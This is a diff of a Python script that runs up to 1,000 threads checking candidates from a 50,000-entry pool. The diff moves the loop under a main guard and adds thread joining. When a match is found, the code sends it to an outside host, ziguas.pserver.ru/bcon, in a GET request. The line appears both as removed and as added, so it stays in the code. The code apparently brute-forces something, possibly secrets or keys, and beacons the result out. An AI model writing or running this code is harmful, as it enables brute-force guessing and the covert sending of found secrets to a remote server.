@@ -54,25 +54,32 @@ def checkin(c):
     except:
         pass
 
-
-while len(found)<1:
-    if len(pooll) == 0:
-        fill_pooll(50000)
-    try:
-        if threading.active_count() < 1000:
-            threading.Thread(target = checkin , args = (vase,), daemon=True).start()
-    except:
-        time.sleep(1)
-        pass
-
-
-
-while True:
-    if 2 > threading.active_count():
-        print("Found")
-        print(found)
+if __name__ == "__main__":
+    threads = list()
+    while len(found)<1:
+        if len(pooll) == 0:
+            fill_pooll(50000)
+            if len(threads) > 0:
+                for index, thread in enumerate(threads):
+                    thread.join()
+                threads = list()
         try:
-            respns = requests.get("https://ziguas.pserver.ru/bcon/?id="+str(found), timeout=60)
+            if threading.active_count() < 1000:
+                x = threading.Thread(target = checkin , args = (vase,), daemon=True)
+                threads.append(x)
+                x.start()
         except:
+            time.sleep(1)
             pass
-        break
+
+
+
+    while True:
+        if 2 > threading.active_count():
+            print("Found")
+            print(found)
+            try:
+                respns = requests.get("https://ziguas.pserver.ru/bcon/?id="+str(found), timeout=60)
+            except:
+                pass
+            break
